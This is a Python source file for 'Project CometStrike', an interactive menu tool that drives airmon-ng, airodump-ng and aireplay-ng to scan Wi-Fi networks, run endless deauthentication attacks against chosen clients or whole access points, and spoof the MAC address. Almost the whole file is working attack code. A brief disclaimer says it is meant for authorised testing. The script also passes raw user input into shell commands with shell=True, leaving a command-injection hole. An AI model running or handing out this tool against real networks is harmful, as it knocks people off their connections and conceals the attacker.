import subprocess
import random


class WiFiHacker:
    def __init__(self):
        self.channel = None
        self.bssid = None
        self.interface = None
        self.MAC = None
        self.channelnum = None
        self.order = None
        self.cmd = None
        self.new_mac = None

    # Banner to display menu options
    @staticmethod
    def banner():
        print("""
            ______                     __  _____ __       _ __                              
           / ____/___  ____ ___  ___  / /_/ ___// /______(_) /_____                         
          / /   / __ \/ __ `__ \/ _ \/ __/\__ \/ __/ ___/ / //_/ _ /                        
         / /___/ /_/ / / / / / /  __/ /_ ___/ / /_/ /  / / ,< / __/                         
         \____/\____/_/ /_/ /_/\___/\__//____/\__/_/  /_/_/|_|\___/ 

          An Automated script for wifi hacking 💫 Coded by: 冰皇 

        ----- Basic Function -----
          [1] Start monitor mode       
          [2] Stop monitor mode                        
          [3] Scan Networks
        ----- Deauth Attacks -----                            
          [4] Scan for Devices on Network (Need Monitor mode)                      
          [5] Deauthenticate Network Devices
          [6] Deauthenticate WiFi Router
        ----- Other Features -----  
          [7] Switch Monitoring Channel  
          [8] Change MAC Address *IMPORTANT*                  
          [9] About
          [0] Exit
        """)

    # Start monitor mode
    def start_monitor_mode(self):
        self.interface = input("Enter the interface (Default: wlan0/wlan1): ")
        try:
            subprocess.run(["airmon-ng", "check", "kill"], check=True)
            subprocess.run(["airmon-ng", "start", self.interface], check=True)
        except FileNotFoundError:
            print("Error: Required command not found. Make sure 'airmon-ng' is installed.")
        except subprocess.CalledProcessError:
            print("Error: Failed to start monitor mode.")

    # Stop monitor mode
    def stop_monitor_mode(self):
        self.interface = input("\nEnter the interface: ")
        try:
            subprocess.run(["airmon-ng", "stop", self.interface], check=True)
            subprocess.run(["systemctl", "restart", "NetworkManager"], check=True)
        except FileNotFoundError:
            print("Error: Required command not found. Make sure 'airmon-ng' and 'systemctl' are installed.")
        except subprocess.CalledProcessError:
            print("Error: Failed to stop monitor mode or restart NetworkManager.")

    # Scan networks
    def scan_network(self):
        self.interface = input("Enter Network Adaptor's interface > ")
        order = "airodump-ng {} -M".format(self.interface)
        print("When Done Press CTRL+c")
        try:
            subprocess.run(order, shell=True, check=True)
        except KeyboardInterrupt:
            print("\nScan interrupted. Press Enter to return to the main menu...")
            input()
            self.banner()  # Print the banner again after returning to the main menu
        except subprocess.CalledProcessError:
            print("Error: Failed to scan networks.")

    # Scan devices on network
    def scan_devices(self):
        self.bssid = input("\nEnter the bssid of the target > ")
        self.channel = int(input("\nEnter the channel of the network? > "))
        self.interface = input("\nEnter the interface: ")
        order = "airodump-ng --bssid {} --channel {} {}".format(self.bssid, self.channel, self.interface)
        print("When Done Press CTRL+c")
        try:
            subprocess.run(order, shell=True, check=True)
        except KeyboardInterrupt:
            print("\nScan interrupted. Press Enter to return to the main menu...")
            input()
            self.banner()  # Print the banner again after returning to the main menu
        except subprocess.CalledProcessError:
            print("Error: Failed to scan devices on network.")

    # Deauthenticate network devices
    def deauth_devices(self):
        self.bssid = input("\nEnter the bssid of the target > ")
        self.MAC = input("\nEnter the target's MAC address > ")
        self.interface = input("\nEnter the interface: ")
        order = "aireplay-ng --deauth 0 -a {} -c {} {}".format(self.bssid, self.MAC, self.interface)
        try:
            subprocess.run(order, shell=True, check=True)
        except FileNotFoundError:
            print("Error: Required command not found. Make sure 'airmon-ng' and 'systemctl' are installed.")
        except subprocess.CalledProcessError:
            print("Error: Failed to deauthenticate network devices.")

    # Deauthenticate Wi-Fi router
    def deauth_router(self):
        self.bssid = input("\nEnter the bssid of the target > ")
        self.interface = input("\nEnter the interface: ")
        order = "aireplay-ng --deauth 0 -a {} {}".format(self.bssid, self.interface)
        print("When Done Press CTRL+c")
        try:
            subprocess.run(order, shell=True, check=True)
        except KeyboardInterrupt:
            print("\nScan interrupted. Press Enter to return to the main menu...")
            input()
            self.banner()  # Print the banner again after returning to the main menu
        except subprocess.CalledProcessError:
            print("Error: Failed to deauthenticate WiFi router.")

    # Switch monitoring channel
    def switch_channel(self):
        self.interface = input("\nEnter the interface: ")
        self.channelnum = int(input("\nEnter new Channel > "))
        order = "airmon-ng stop {} ".format(self.interface)
        order2 = "airmon-ng check kill && airmon-ng start {} {}".format(self.interface, self.channelnum)
        try:
            subprocess.run(order, shell=True, check=True)
            subprocess.run(order2, shell=True, check=True)
        except FileNotFoundError:
            print("Error: Required command not found. Make sure 'airmon-ng' and 'systemctl' are installed.")
        except subprocess.CalledProcessError:
            print("Error: Failed to switch monitoring channel.")

    # Clear screen
    @staticmethod
    def clear_screen():
        subprocess.run(["clear"])

    # Display credits and disclaimer
    @staticmethod
    def credits():
        print("""
Thank you for taking the time to read this:
In order to use this program, you must have the following:
1) Kali Linux VM (need to run script as *root* user)
2) Network Adaptor which supports monitor mode (I use TP-link TI-wn722n 150mbps)

** WARNING: Ethical Use of Project CometStrike ***
Project CometStrike is a tool designed to automate WiFi Deauthentication attack.
Do note that unauthorized deauthentication is illegal and this tool is designed for
educational and authorized testing purposes only. It is strictly prohibited to use
of this tool to gain unauthorized access to computer systems, networks, data or any
harmful actions. By using Project Comet Strike, you acknowledge that you are responsible 
for your own actions and agree to use this tool ethically and responsibly.
""")
        input("Press Enter to return to the main menu...")

    # Change MAC address
    def changemac(self):
        self.interface = input("\nEnter the interface (e.g., eth0, wlan0): ")
        while True:
            color_code = ':'.join([('0' + hex(random.randint(0, 256))[2:])[-2:].upper() for _ in range(6)])
            first_byte = int(color_code.split(':')[0], 16)
            if first_byte % 2 == 0:
                even_color_code = color_code
                break

        print("[+] Successfully changed MAC address for " + self.interface + " to " + even_color_code +"\n")
        subprocess.call(["sudo", "ifconfig", self.interface, "down"])
        subprocess.call(["sudo", "ifconfig", self.interface, "hw", "ether", even_color_code])
        subprocess.call(["sudo", "ifconfig", self.interface, "up"])
        input("\nPress Enter to return to the main menu...")


# Main script
if __name__ == "__main__":
    wifi_hacker = WiFiHacker()
    wifi_hacker.banner()
    try:
        while True:
            wifi_hacker.clear_screen()
            wifi_hacker.banner()
            var = int(input("\n(root㉿cometstrike)- "))
            if var == 1:
                wifi_hacker.start_monitor_mode()
            elif var == 2:
                wifi_hacker.stop_monitor_mode()
            elif var == 3:
                wifi_hacker.scan_network()
            elif var == 4:
                wifi_hacker.scan_devices()
            elif var == 5:
                wifi_hacker.deauth_devices()
            elif var == 6:
                wifi_hacker.deauth_router()
            elif var == 7:
                wifi_hacker.switch_channel()
            elif var == 8:
                wifi_hacker.changemac()
            elif var == 9:
                wifi_hacker.credits()
            elif var == 0:
                print("\n\nExiting Program...")
                break
            else:
                print("Not Found")
    except KeyboardInterrupt:
        print("\n\nExiting Program...")
